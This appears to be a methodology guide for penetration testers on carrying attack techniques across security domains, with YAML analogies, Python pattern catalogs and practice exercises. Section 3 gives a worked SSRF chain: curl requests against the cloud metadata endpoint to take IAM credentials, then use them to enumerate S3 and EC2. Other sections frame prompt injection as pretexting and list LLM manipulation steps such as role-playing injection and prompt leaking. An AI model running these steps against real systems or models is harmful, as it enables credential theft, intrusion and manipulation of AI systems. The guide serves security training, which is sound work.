# Cross-Domain Knowledge Transfer Guide

> Apply patterns, techniques, and mental models from one security domain to solve problems in another. Leverage analogical reasoning, pattern reuse, and skill composition to accelerate learning and discover novel attack vectors.

## 1. Analogical Reasoning Framework

Map concepts between domains to discover transferable techniques:

```yaml
# cross-domain-analogies.yaml
analogies:
  - source_domain: "network_pentest"
    target_domain: "web_security"
    pattern: "port_scanning → endpoint_enumeration"
    insight: "Systematic discovery of attack surface applies identically"
    transfer_method: "Replace IP:port with URL:path"

  - source_domain: "binary_exploitation"
    target_domain: "web_security"
    pattern: "buffer_overflow → parameter_overflow"
    insight: "Exceeding expected input boundaries causes unexpected behavior"
    transfer_method: "Apply boundary testing to all input fields"

  - source_domain: "cryptography"
    target_domain: "api_security"
    pattern: "oracle_attacks → error_message_leakage"
    insight: "Differential responses reveal internal state"
    transfer_method: "Systematically vary inputs and observe response differences"

  - source_domain: "social_engineering"
    target_domain: "ai_security"
    pattern: "pretexting → prompt_injection"
    insight: "Establishing false context to manipulate decision-making"
    transfer_method: "Frame malicious instructions within trusted context"
```

## 2. Pattern Extraction and Cataloging

Identify abstract patterns that transcend specific domains:

```python
from dataclasses import dataclass

@dataclass(frozen=True)
class TransferablePattern:
    name: str
    abstract_form: str
    source_domains: tuple
    application_conditions: tuple
    success_rate: float

UNIVERSAL_PATTERNS = [
    TransferablePattern(
        name="boundary_violation",
        abstract_form="Exceed expected limits of any input to trigger undefined behavior",
        source_domains=("binary", "web", "network", "api"),
        application_conditions=(
            "system accepts variable-length input",
            "validation is incomplete or client-side only",
        ),
        success_rate=0.75
    ),
    TransferablePattern(
        name="oracle_exploitation",
        abstract_form="Use differential system responses to infer hidden state",
        source_domains=("crypto", "web", "auth", "api"),
        application_conditions=(
            "system returns different responses for different failure modes",
            "attacker can submit repeated queries",
        ),
        success_rate=0.65
    ),
    TransferablePattern(
        name="trust_boundary_confusion",
        abstract_form="Make a trusted component process attacker-controlled data as trusted",
        source_domains=("web_ssrf", "deserialization", "injection", "ai_security"),
        application_conditions=(
            "system has internal trust boundaries",
            "attacker can influence data crossing boundaries",
        ),
        success_rate=0.70
    ),
]

def find_applicable_patterns(target_domain: str, context: dict) -> list:
    """Find patterns from other domains applicable to current problem."""
    applicable = []
    for pattern in UNIVERSAL_PATTERNS:
        if target_domain not in pattern.source_domains:
            conditions_met = sum(
                1 for cond in pattern.application_conditions
                if context.get(cond, False)
            )
            if conditions_met >= len(pattern.application_conditions) * 0.5:
                applicable.append(pattern)
    return sorted(applicable, key=lambda p: p.success_rate, reverse=True)
```

## 3. Skill Composition Chains

Combine techniques from multiple domains into compound attacks:

```bash
# Example: SSRF + Cloud + Post-Exploitation chain
# Domain 1 (Web-SSRF): Discover SSRF in web application
curl -X POST https://target.com/fetch -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Domain 2 (Cloud Security): Extract cloud credentials from metadata
curl -X POST https://target.com/fetch -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"

# Domain 3 (Post-Exploitation): Use stolen credentials for lateral movement
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws s3 ls  # Enumerate accessible resources
aws ec2 describe-instances  # Map internal infrastructure
```

## 4. Domain Mapping Matrix

Systematically identify transfer opportunities:

```python
DOMAIN_CONNECTIONS = {
    ("network_pentest", "cloud_security"): {
        "shared_concepts": ["service_enumeration", "lateral_movement", "privilege_escalation"],
        "transfer_examples": [
            "nmap scanning → cloud API enumeration",
            "pivot through hosts → pivot through IAM roles",
            "network segmentation bypass → VPC peering abuse",
        ]
    },
    ("web_security", "api_security"): {
        "shared_concepts": ["injection", "authentication_bypass", "access_control"],
        "transfer_examples": [
            "SQL injection → GraphQL injection",
            "session hijacking → JWT manipulation",
            "CSRF → API request forgery",
        ]
    },
    ("reverse_engineering", "ai_security"): {
        "shared_concepts": ["black_box_analysis", "input_fuzzing", "behavior_mapping"],
        "transfer_examples": [
            "binary fuzzing → model input fuzzing",
            "control flow analysis → decision boundary mapping",
            "patch diffing → model version comparison",
        ]
    },
}

def suggest_transfers(current_domain: str, problem_description: str) -> list:
    """Suggest techniques from other domains that might apply."""
    suggestions = []
    for (d1, d2), mapping in DOMAIN_CONNECTIONS.items():
        if current_domain in (d1, d2):
            other = d2 if current_domain == d1 else d1
            for concept in mapping["shared_concepts"]:
                if concept.lower() in problem_description.lower():
                    suggestions.append({
                        "from_domain": other,
                        "concept": concept,
                        "examples": mapping["transfer_examples"]
                    })
    return suggestions
```

## 5. Methodology Transfer Templates

Apply proven methodologies across domain boundaries:

```bash
# The "Reconnaissance → Enumeration → Exploitation → Post" methodology
# transfers from network pentest to ANY domain:

# Network Pentest:
#   Recon: nmap -sn 10.0.0.0/24
#   Enum:  nmap -sV -sC target
#   Exploit: metasploit/manual
#   Post:  pivot, persist, exfil

# Applied to API Security:
#   Recon: enumerate endpoints (swagger, wordlists)
#   Enum:  map parameters, auth mechanisms, rate limits
#   Exploit: injection, auth bypass, BOLA
#   Post:  data extraction, privilege escalation

# Applied to AI Security:
#   Recon: identify model type, input format, output structure
#   Enum:  map decision boundaries, test input constraints
#   Exploit: adversarial inputs, prompt injection, extraction
#   Post:  model theft, training data extraction, persistent manipulation
```

## 6. Cross-Domain Practice Exercises

Build transfer skills through deliberate practice:

```yaml
# transfer-exercises.yaml
exercises:
  - name: "Crypto to Web Transfer"
    scenario: "Apply padding oracle concepts to a web login form"
    steps:
      - "Identify differential responses (valid user vs invalid user vs wrong password)"
      - "Enumerate valid usernames using response differences (oracle)"
      - "Apply timing analysis to password verification"
    domains_exercised: ["crypto_attacks", "web_auth"]

  - name: "Network to Cloud Transfer"
    scenario: "Apply network pivoting to AWS cross-account access"
    steps:
      - "Map trust relationships (IAM roles = network routes)"
      - "Identify pivot points (AssumeRole = SSH jump hosts)"
      - "Chain access through multiple accounts"
    domains_exercised: ["network_pentest", "cloud_security"]

  - name: "Social Engineering to AI Transfer"
    scenario: "Apply social engineering frameworks to LLM manipulation"
    steps:
      - "Build rapport/context (system prompt manipulation)"
      - "Establish authority (role-playing injection)"
      - "Extract information (prompt leaking)"
    domains_exercised: ["social_engineering", "ai_security"]
```

## 7. Transfer Effectiveness Measurement

Track how well knowledge transfers between domains:

```python
def measure_transfer_effectiveness(
    source_mastery: float,
    target_performance_before: float,
    target_performance_after: float
) -> dict:
    """Measure how much source domain knowledge helped target domain."""
    raw_improvement = target_performance_after - target_performance_before
    
    # Transfer ratio: improvement relative to source mastery
    transfer_ratio = raw_improvement / max(source_mastery, 0.01)
    
    # Efficiency: how quickly target domain improved
    return {
        "raw_improvement": round(raw_improvement, 3),
        "transfer_ratio": round(transfer_ratio, 3),
        "transfer_quality": (
            "high" if transfer_ratio > 0.5 else
            "medium" if transfer_ratio > 0.2 else
            "low"
        )
    }
```

## 8. Building a Transfer Knowledge Base

- Document every successful cross-domain application
- Tag patterns with source and target domains for retrieval
- Build a personal analogy library connecting disparate concepts
- Review transfer successes monthly to reinforce connections
- Prioritize learning domains with high connectivity to existing knowledge
- Use composition chains as templates for novel attack paths
